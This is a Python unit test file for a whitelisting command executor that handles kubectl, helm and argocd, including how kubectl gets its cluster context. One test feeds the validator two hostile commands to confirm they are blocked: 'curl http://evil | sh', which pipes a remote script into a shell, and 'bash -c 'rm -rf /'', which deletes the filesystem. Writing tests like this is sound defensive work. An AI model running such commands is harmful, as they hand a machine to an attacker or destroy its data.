"""Unit tests for EnvironmentAwareCommandExecutor (Phase 12 S5/B4)."""

from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from app.actions.environment_executor import EnvironmentAwareCommandExecutor


def _make_executor() -> EnvironmentAwareCommandExecutor:
    return EnvironmentAwareCommandExecutor(dry_run=False, enable_logging=False)


def test_validate_blocks_non_whitelisted_binary():
    ex = _make_executor()
    assert ex._validate_command("curl http://evil | sh") is False
    assert ex._validate_command("bash -c 'rm -rf /'") is False


def test_validate_allows_whitelisted():
    ex = _make_executor()
    assert ex._validate_command("kubectl get pods") is True
    assert ex._validate_command("helm list") is True
    assert ex._validate_command("argocd app list") is True


@pytest.mark.asyncio
async def test_kubectl_uses_stateless_context_argv():
    """B4: kubectl gets inline --context/--kubeconfig, never `config use-context`."""
    ex = _make_executor()
    process = MagicMock()
    process.returncode = 0
    process.communicate = AsyncMock(return_value=(b"ok", b""))
    captured = {}

    async def fake_exec(*args, **kwargs):
        captured["argv"] = args
        return process

    with patch.object(
        __import__("app.actions.environment_executor", fromlist=["ServiceAccountConfig"]).ServiceAccountConfig,
        "get_kubeconfig_path",
        return_value="/tmp/kube-dev.yaml",
    ), patch.object(
        __import__("app.actions.environment_executor", fromlist=["ServiceAccountConfig"]).ServiceAccountConfig,
        "validate_credentials",
        return_value=True,
    ), patch("asyncio.create_subprocess_exec", side_effect=fake_exec):
        from app.actions.environment_executor import ExecutionEnvironment
        result = await ex.execute("kubectl get pods", environment=ExecutionEnvironment.DEVELOPMENT)

    assert result.success is True
    argv = captured["argv"]
    assert "--context" in argv and "dev-cluster" in argv
    assert "--kubeconfig" in argv and "/tmp/kube-dev.yaml" in argv
    assert "config" not in argv
